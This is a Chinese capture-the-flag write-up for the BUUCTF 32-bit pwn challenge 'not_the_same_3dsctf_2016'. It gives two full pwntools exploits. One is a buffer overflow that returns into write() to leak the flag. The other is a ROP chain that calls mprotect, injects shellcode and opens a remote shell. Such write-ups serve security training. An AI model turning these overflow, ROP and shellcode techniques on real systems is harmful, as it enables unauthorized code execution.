# 分析

来自[BUUCTF在线评测 (buuoj.cn)](https://buuoj.cn/challenges#not_the_same_3dsctf_2016)

这是一道ret2text(32)题，但是也可以用ret2shellcode思路来做

# exp

题解一：通过read函数把flag的读出来

```python
from pwn import *
context(os='linux',arch='i386',log_level='debug')
p=remote('node5.buuoj.cn',26095)
#p=process('./not_the_same_3dsctf_2016')
elf=ELF('./not_the_same_3dsctf_2016')
back_addr=0x80489A0
printf_addr = elf.sym['write']
flag_addr=0x80ECA2D
main_addr=0x80489E0
payload1=flat(b'A'*0x2d,p32(back_addr),p32(printf_addr),p32(main_addr),p32(1),p32(flag_addr),p32(50))
#gdb.attach(p)
p.sendline(payload1)
p.recv()

```

题解二：思路通过mprotect函数对.got.plt段进行改成可读可写可执行，注入shellcode

```python
from pwn import *
context(os='linux',arch='i386',log_level='debug')
p=remote('node5.buuoj.cn',27042)
#p=process('./not_the_same_3dsctf_2016')
elf=ELF('./not_the_same_3dsctf_2016')

mprotect = elf.sym['mprotect']
read_addr=elf.sym['read']
#mprotect=0x0806ED40
#read_addr=0x0806E200
NX_addr=0x080EB000
pop3_ret=0x0804f420
shellcode=asm(shellcraft.sh())

payload1=flat(b'A'*0x2d,p32(mprotect),p32(pop3_ret),p32(NX_addr),p32(0x100),p32(7),p32(read_addr),p32(pop3_ret),p32(0),p32(NX_addr),p32(len(shellcode)),p32(NX_addr))
#gdb.attach(p)
p.sendline(payload1)
p.sendline(shellcode)
p.interactive()
```

